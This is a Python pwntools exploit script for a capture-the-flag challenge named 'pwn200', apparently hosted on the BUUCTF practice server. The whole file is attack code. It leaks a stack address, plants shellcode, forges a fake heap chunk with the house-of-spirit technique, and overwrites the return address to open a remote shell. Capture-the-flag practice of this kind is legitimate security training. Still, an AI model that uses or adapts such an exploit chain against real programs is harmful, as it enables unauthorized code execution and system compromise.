from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./pwn200')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# io = process('./pwn200')
io = remote('node4.buuoj.cn', 25310)

def leak_stack():
    global fake_chunk_addr, shellcode_addr
    payload = asm(shellcraft.sh())
    payload += b'A' * (48 - len(payload))
    io.sendafter('who are u?\n', payload)
    stack_addr = u64(io.recvline()[48:54].ljust(8, b'\x00'))
    rbp_addr = stack_addr - 0x20
    shellcode_addr = stack_addr - 0x20 - 0x30
    fake_chunk_addr = stack_addr - 0x20 - 0x30 - 0x40           # make fake.size = 0x40
    log.success('stack_addr :' + hex(stack_addr))
    log.success('shellcode_addr :' + hex(shellcode_addr))

def house_of_spirit():
    io.sendlineafter('give me your id ~~?\n', '65')             # set next.size = 0x41
    payload = p64(0) * 4
    payload += p64(0) + p64(0x41)                               # fake_chunk.head
    payload += p64(0) + p64(fake_chunk_addr)                    # fake_chunk.userdata
    io.sendafter('give me money~\n', payload)

    io.sendlineafter('your choice : ', '2')                     # free fake_chunk
    io.sendlineafter('your choice : ', '1')                     # malloc fake_chunk
    io.sendlineafter('how long?\n', '48')

    payload = b'A' * 0x10
    payload += b'A' * 0x8                                       # rbp
    payload += p64(shellcode_addr)                              # ret2shellcode
    io.sendlineafter('48\n', payload)
    
    io.sendlineafter('your choice : ', '3')
    io.interactive()

if __name__ == '__main__':
    leak_stack()
    house_of_spirit()
